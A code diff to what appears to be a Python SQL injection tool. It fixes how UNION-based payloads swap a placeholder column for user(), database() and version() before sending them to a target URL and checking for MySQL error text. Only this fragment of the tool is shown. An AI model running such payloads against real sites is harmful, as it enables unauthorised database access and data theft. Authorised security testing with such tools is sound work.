@@ -4,6 +4,7 @@ import datetime
 import time
 import colorama
 import argparse
+import re
 import os
 from colorama import Fore
 from colorama import Style
@@ -174,9 +175,9 @@ if URL_TARGET:
                                 print("     Columns : : {}".format(num_columns))
                                 print("")
                                 if args.dbs:
-                                    payload_3 = payload_2.replace("2", "user()")
-                                    payload_4 = payload_2.replace("2", "database()")
-                                    payload_5 = payload_2.replace("2", "version()")
+                                    payload_3 = re.sub(r'\b2\b', 'user()', payload_2)
+                                    payload_4 = re.sub(r'\b2\b', 'database()', payload_2)
+                                    payload_5 = re.sub(r'\b2\b', 'version()', payload_2)
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
                                     result_3 = requests.get(URL_TARGET + payload_3)
                                     if "The used SELECT" in result_3:
